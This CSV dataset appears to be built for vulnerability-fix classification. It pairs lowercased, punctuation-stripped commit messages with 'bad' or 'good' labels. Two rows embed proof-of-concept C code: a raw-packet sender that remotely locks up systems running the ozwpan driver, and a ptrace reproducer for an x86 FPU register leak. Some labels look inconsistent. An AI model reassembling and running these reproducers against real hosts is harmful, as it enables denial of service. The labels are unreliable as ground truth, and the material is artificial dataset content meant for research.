"";"index";"all_text";"vuln"
"1130";"1842";"coresight fix kernel panic caused by invalid cpu commit d52c9750f150 coresight reset enable_sink flag when need be caused a kernel panic because of the using of an invalid value after for_each_cpu cpu mask value of local variable cpu become invalid cause following cpu_to_node access invalid memory area this patch brings the deleted cpu cpumask_first mask back panic log perf record e cs_etm l unable to handle kernel paging request at virtual address fffe801804af4f10 pgd ffff8017ce031600 fffe801804af4f10 pgd 0000000000000000 pud 0000000000000000 internal error oops 96000004 1 smp module linked in cpu 33 pid 1619 comm perf not tainted 4 7 1 16 hardware name huawei taishan 2280 ch05tevba bios 1 10 11 24 2016 task ffff8017cb0c8400 ti ffff8017cb154000 task ti ffff8017cb154000 pc is at tmc_alloc_etf_buffer 0x60 0xd4 lr is at tmc_alloc_etf_buffer 0x44 0xd4 pc ffff000008633df8 lr ffff000008633ddc pstate 60000145 sp ffff8017cb157b40 x29 ffff8017cb157b40 x28 0000000000000000 skip 7a60 ffff000008c64dc8 0000000000000006 0000000000000253 ffffffffffffffff 7a80 0000000000000000 0000000000000000 ffff0000080872cc 0000000000000001 ffff000008633df8 tmc_alloc_etf_buffer 0x60 0xd4 ffff000008632b9c etm_setup_aux 0x1dc 0x1e8 ffff00000816eed4 rb_alloc_aux 0x2b0 0x338 ffff00000816a5e4 perf_mmap 0x414 0x568 ffff0000081ab694 mmap_region 0x324 0x544 ffff0000081abbe8 do_mmap 0x334 0x3e0 ffff000008191150 vm_mmap_pgoff 0xa4 0xc8 ffff0000081a9a30 sys_mmap_pgoff 0xb0 0x22c ffff0000080872e4 sys_mmap 0x18 0x28 ffff0000080843f0 el0_svc_naked 0x24 0x28 code 912040a5 d0001c00 f873d821 911c6000 b8656822 end trace 98933da8f92b0c9a signed off by wang nan wangnan0 huawei com cc xia kaixu xiakaixu huawei com cc li zefan lizefan huawei com cc mathieu poirier mathieu poirier linaro org cc linux arm kernel list infradead org cc linux kernel vger kernel org fix d52c9750f150 coresight reset enable_sink flag when need be signed off by mathieu poirier mathieu poirier linaro org cc stable stable vger kernel org 4 10 signed off by greg kroah hartman gregkh linuxfoundation org";"bad"
"1131";"2231";"fix cve 2018 19995";"bad"
"1132";"7192";"j automatically convert var to let and const in remaining file this commit wa automatically generated by tool lint only eslint fix except for the eslintrc json change itself signed off by anders kaseorg anders zulipchat com";"good"
"1133";"831";"update arbitrary file upload vulnerability";"bad"
"1134";"6608";"fix several x in delete form";"bad"
"1135";"1041";"ozwpan unchecked signed subtraction lead to do the subtraction here wa using a signed integer and did not have any bound checking at all this commit add proper bound checking made easy by use of an unsigned integer this way a single packet won t be able to remotely trigger a massive loop locking up the system for a considerable amount of time a poc follows below which requires ozprotocol h from this module include arpa inet h include linux if_packet h include net if h include netinet ether h include stdio h include string h include stdlib h include endian h include sys ioctl h include sys socket h define u8 uint8_t define u16 uint16_t define u32 uint32_t define __packed __attribute__ __packed__ include ozprotocol h static int hex2num char c if c 0 c 9 return c 0 if c a c f return c a 10 if c a c f return c a 10 return 1 static int hwaddr_aton const char txt uint8_t addr int i for i 0 i 6 i int a b a hex2num txt if a 0 return 1 b hex2num txt if b 0 return 1 addr a 4 b if i 5 txt return 1 return 0 int main int argc char argv if argc 3 fprintf stderr usage s interface destination_mac n argv 0 return 1 uint8_t dest_mac 6 if hwaddr_aton argv 2 dest_mac fprintf stderr invalid mac address n return 1 int sockfd socket af_packet sock_raw ipproto_raw if sockfd 0 perror socket return 1 struct ifreq if_idx int interface_index strncpy if_idx ifr_ifrn ifrn_name argv 1 ifnamsiz 1 if ioctl sockfd siocgifindex if_idx 0 perror siocgifindex return 1 interface_index if_idx ifr_ifindex if ioctl sockfd siocgifhwaddr if_idx 0 perror siocgifhwaddr return 1 uint8_t src_mac uint8_t if_idx ifr_hwaddr sa_data struct struct ether_header ether_header struct oz_hdr oz_hdr struct oz_elt oz_elt struct oz_elt_connect_req oz_elt_connect_req struct oz_elt oz_elt2 struct oz_multiple_fixed oz_multiple_fixed __packed packet ether_header ether_type htons oz_ethertype ether_shost src_mac 0 src_mac 1 src_mac 2 src_mac 3 src_mac 4 src_mac 5 ether_dhost dest_mac 0 dest_mac 1 dest_mac 2 dest_mac 3 dest_mac 4 dest_mac 5 oz_hdr control oz_f_ack_requested oz_protocol_version oz_version_shift last_pkt_num 0 pkt_num htole32 0 oz_elt type oz_elt_connect_req length sizeof struct oz_elt_connect_req oz_elt_connect_req mode 0 resv1 0 pd_info 0 session_id 0 presleep 0 ms_isoc_latency 0 host_vendor 0 keep_alive 0 apps htole16 1 oz_appid_usb 0x1 max_len_div16 0 ms_per_isoc 0 up_audio_buf 0 ms_per_elt 0 oz_elt2 type oz_elt_app_data length sizeof struct oz_multiple_fixed 3 oz_multiple_fixed app_id oz_appid_usb elt_seq_num 0 type oz_usb_endpoint_data endpoint 0 format oz_data_f_multiple_fixed unit_size 1 data 0 struct sockaddr_ll socket_address sll_ifindex interface_index sll_halen eth_alen sll_addr dest_mac 0 dest_mac 1 dest_mac 2 dest_mac 3 dest_mac 4 dest_mac 5 if sendto sockfd packet sizeof packet 0 struct sockaddr socket_address sizeof socket_address 0 perror sendto return 1 return 0 signed off by jason a donenfeld jason zx2c4 com acked by dan carpenter dan carpenter oracle com cc stable stable vger kernel org signed off by greg kroah hartman gregkh linuxfoundation org";"bad"
"1136";"1814";"fix pixel overrun fix 3";"bad"
"1137";"5671";"fix security fixed presistent x in the sighting popover tool a reported by an external pentest company on behalf of the centre for cyber security belgium ccb";"bad"
"1138";"7242";"have make dist create tar gz tar xz and zip distribution file fix 1277";"good"
"1139";"6504";"fix x injection";"bad"
"1140";"1877";"merge pull request 4 from marcinhoppe fix number encoding correctly encoding value that are not string";"bad"
"1141";"7095";"gt 3203 bookmark ignore event when not showing";"good"
"1142";"12597";"localisation update from translatewiki net 2009 12 05";"good"
"1143";"4194";"usb uas fix bug in handling of alternate setting the uas driver ha a subtle bug in the way it handle alternate setting the uas_find_uas_alt_setting routine return an altsetting value the balternatesetting number in the descriptor but uas_use_uas_driver then treat that value a an index to the intf altsetting array which it isn t normally this doesn t cause any problem because the various alternate setting have balternatesetting value 0 1 2 so the value is equal to the index in the array but this is not guaranteed and andrey konovalov used the syzkaller fuzzer with kasan to get a slab out of bound error by violating this assumption this patch fix the bug by making uas_find_uas_alt_setting return a pointer to the altsetting entry rather than either the value or the index pointer are le subject to misinterpretation signed off by alan stern stern rowland harvard edu reported by andrey konovalov andreyknvl google com tested by andrey konovalov andreyknvl google com cc oliver neukum oneukum suse com cc stable vger kernel org signed off by greg kroah hartman gregkh linuxfoundation org";"bad"
"1144";"9438";"fix x with data html link and form action the academically correct way to filter out xlink hrefs should have been to use hasattributens getattributens with the xlink namespace but from my testing browser don t care about that namespace at all and only use the xlink prefix this mean that even if you correctly specify a different prefix for the xlink n the link won t be detected by the browser xlink prefix otoh even work without specifying the xlink namespace in the xml document reported by liuzhu fantasy7082 hotmail com";"good"
"1145";"12853";"fix menu delete under reporting monitoring business intelligence menu 6881";"good"
"1146";"1335";"nfp abm fix memory leak in nfp_abm_u32_knode_replace in nfp_abm_u32_knode_replace if the allocation for match fails it should go to the error handling instead of returning updated other gotos to have correct errno returned too signed off by navid emamdoost navid emamdoost gmail com signed off by david s miller davem davemloft net";"bad"
"1147";"2701";"fixing bug 2697 web basic for guest account";"bad"
"1148";"66";"do not allow enters return in argument thanks to fabio carretto";"bad"
"1149";"4144";"x86 fpu don t let userspace set bogus xcomp_bv on x86 userspace can use the ptrace or rt_sigreturn system call to set a task s extended state xstate or fpu register ptrace can set them for another task using the ptrace_setregset request with nt_x86_xstate while rt_sigreturn can set them for the current task in either case register can be set to any value but the kernel assumes that the xsave area itself remains valid in the sense that the cpu can restore it however in the case where the kernel is using the uncompacted xstate format which it doe whenever the xsaves instruction is unavailable it wa possible for userspace to set the xcomp_bv field in the xstate_header to an arbitrary value however all bit in that field are reserved in the uncompacted case so when switching to a task with nonzero xcomp_bv the xrstor instruction failed with a gp fault this caused the warn_on_fpu err in copy_kernel_to_xregs to be hit in addition since the error is otherwise ignored the fpu register from the task previously executing on the cpu were leaked fix the bug by checking that the user supplied value of xcomp_bv is 0 in the uncompacted case and returning an error otherwise the reason for validating xcomp_bv rather than simply overwriting it with 0 is that we want userspace to see an error if it incorrectly provides an xsave area in compacted format rather than in uncompacted format note that a before in case of error we clear the task s fpu state this is perhaps non ideal especially for ptrace_setregset it might be better to return an error before changing anything but it seems the clear on error behavior is fine for now and it s a little tricky to do otherwise because it would mean we couldn t simply copy the full userspace state into kernel memory in one __copy_from_user this bug wa found by syzkaller which hit the above mentioned warn_on_fpu warning cpu 1 pid 0 at arch x86 include asm fpu internal h 373 __switch_to 0x5b5 0x5d0 cpu 1 pid 0 comm swapper 1 not tainted 4 13 0 453 hardware name qemu standard pc i440fx piix 1996 bios bochs 01 01 2011 task ffff9ba2bc8e42c0 task stack ffffa78cc036c000 rip 0010 __switch_to 0x5b5 0x5d0 rsp 0000 ffffa78cc08bbb88 eflags 00010082 rax 00000000fffffffe rbx ffff9ba2b8bf2180 rcx 00000000c0000100 rdx 00000000ffffffff rsi 000000005cb10700 rdi ffff9ba2b8bf36c0 rbp ffffa78cc08bbbd0 r08 00000000929fdf46 r09 0000000000000001 r10 0000000000000000 r11 0000000000000000 r12 ffff9ba2bc8e42c0 r13 0000000000000000 r14 ffff9ba2b8bf3680 r15 ffff9ba2bf5d7b40 f 00007f7e5cb10700 0000 g ffff9ba2bf400000 0000 knlgs 0000000000000000 c 0010 d 0000 e 0000 cr0 0000000080050033 cr2 00000000004005cc cr3 0000000079fd5000 cr4 00000000001406e0 call trace code 84 00 00 00 00 00 e9 11 fd ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 e7 fa ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 c2 fa ff ff 0f ff 66 0f 1f 84 00 00 00 00 00 e9 d4 fc ff ff 66 66 2e 0f 1f here is a c reproducer the expected behavior is that the program spin forever with no output however on a buggy kernel running on a processor with the xsave feature but without the xsaves feature e g sandy bridge through broadwell for intel within a second or two the program report that the xmm register were corrupted i e were not restored correctly with config_x86_debug_fpu y it also hit the above kernel warning define _gnu_source include stdbool h include inttypes h include linux elf h include stdio h include sys ptrace h include sys uio h include sys wait h include unistd h int main void int pid fork uint64_t xstate 512 struct iovec iov iov_base xstate iov_len sizeof xstate if pid 0 bool tracee true for int i 0 i sysconf _sc_nprocessors_onln tracee i tracee fork 0 uint32_t xmm0 4 0 3 tracee 0x00000000 0xdeadbeef asm volatile movdqu 0 xmm0 n mov 0 rbx n 1 movdqu xmm0 0 n mov 0 rax n cmp rax rbx n je 1b n m xmm0 rax rbx xmm0 printf bug xmm register corrupted tracee d xmm0 08x 08x 08x 08x n tracee xmm0 0 xmm0 1 xmm0 2 xmm0 3 else usleep 100000 ptrace ptrace_attach pid 0 0 wait null ptrace ptrace_getregset pid nt_x86_xstate iov xstate 65 1 ptrace ptrace_setregset pid nt_x86_xstate iov ptrace ptrace_cont pid 0 0 wait null return 1 note the program only test for the bug using the ptrace system call the bug can also be reproduced using the rt_sigreturn system call but only when called from a 32 bit program since for 64 bit program the kernel restores the fpu state from the signal frame by doing xrstor directly from userspace memory with proper error checking reported by dmitry vyukov dvyukov google com signed off by eric biggers ebiggers google com reviewed by kees cook keescook chromium org reviewed by rik van riel riel redhat com acked by dave hansen dave hansen linux intel com cc stable vger kernel org v3 17 cc andrew morton akpm linux foundation org cc andy lutomirski luto amacapital net cc andy lutomirski luto kernel org cc borislav petkov bp alien8 de cc eric biggers ebiggers3 gmail com cc fenghua yu fenghua yu intel com cc kevin hao haokexin gmail com cc linus torvalds torvalds linux foundation org cc michael halcrow mhalcrow google com cc oleg nesterov oleg redhat com cc peter zijlstra peterz infradead org cc thomas gleixner tglx linutronix de cc wanpeng li wanpeng li hotmail com cc yu cheng yu yu cheng yu intel com cc kernel hardening list openwall com fix 0b29643a5843 x86 xsaves change compacted format xsave area header link http lkml kernel org r 20170922174156 16780 2 ebiggers3 gmail com link http lkml kernel org r 20170923130016 21448 25 mingo kernel org signed off by ingo molnar mingo kernel org";"bad"
